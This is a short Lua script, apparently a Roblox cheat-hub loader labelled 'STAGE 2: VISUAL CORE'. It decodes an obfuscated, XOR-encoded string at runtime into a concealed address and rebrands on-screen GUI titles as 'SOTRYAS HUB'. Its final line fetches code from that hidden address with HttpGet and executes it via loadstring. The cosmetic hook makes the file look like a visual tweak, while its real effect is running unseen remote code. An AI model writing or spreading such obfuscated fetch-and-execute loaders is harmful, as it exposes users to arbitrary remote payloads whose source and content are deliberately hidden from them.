
--[[ STAGE 2: VISUAL CORE ]]
local C3NmixIkRT7OkG="\012\023\029\086\043\042\027\021\018\062\238\235\234\227\224\206\200\205\228\247\223\222\194\214\194\241\192\168\170\212\166\169\204\173\181\183\187\141\139\181\135\155\169\223\157\159\130\149\174\110\109\149\122\101\104\097\117\096\176\120\070\072\114\069\072\095\070\086\082\080\108\045\038\081\099\056\061\035\049\050\014\057\007\049\030\027\011\021\031\238\022\023\045\225\018\254\062\061\015\243\243\202\201\240"local RQsoTtfnXnxLNscSM=238 local OPD54EMW4ODXo2n=103 local JUmDOvu3j4ndZnykP=1 local MoYNnxdawNrCLfvEGN=3 local lZZXIkdtsRNE=23 local w947MiopRIaS=true local Kb8XREaBl4bBe=bit32 and bit32.bxor if not Kb8XREaBl4bBe then Kb8XREaBl4bBe=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local DOQ4xBViEHePx8={}for wA97Inom_oO_wJ9_wtnaJ2=1,#C3NmixIkRT7OkG do local kTrQ24thdBeyrYRY=string.byte(C3NmixIkRT7OkG,wA97Inom_oO_wJ9_wtnaJ2)local bdadP5jXEyxEwU=(OPD54EMW4ODXo2n+(wA97Inom_oO_wJ9_wtnaJ2*MoYNnxdawNrCLfvEGN)+lZZXIkdtsRNE)%256 if JUmDOvu3j4ndZnykP==0 then kTrQ24thdBeyrYRY=(kTrQ24thdBeyrYRY-bdadP5jXEyxEwU)%256 DOQ4xBViEHePx8[wA97Inom_oO_wJ9_wtnaJ2]=string.char(Kb8XREaBl4bBe(kTrQ24thdBeyrYRY,RQsoTtfnXnxLNscSM))else kTrQ24thdBeyrYRY=Kb8XREaBl4bBe(kTrQ24thdBeyrYRY,RQsoTtfnXnxLNscSM)DOQ4xBViEHePx8[wA97Inom_oO_wJ9_wtnaJ2]=string.char((kTrQ24thdBeyrYRY-bdadP5jXEyxEwU)%256)end end local uEjGfTou6YG9=table.concat(DOQ4xBViEHePx8)if w947MiopRIaS then uEjGfTou6YG9=string.reverse(uEjGfTou6YG9)end local Tr_AUVULyDQdmrYJP=uEjGfTou6YG9
local HubName = "SOTRYAS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Tr_AUVULyDQdmrYJP))()
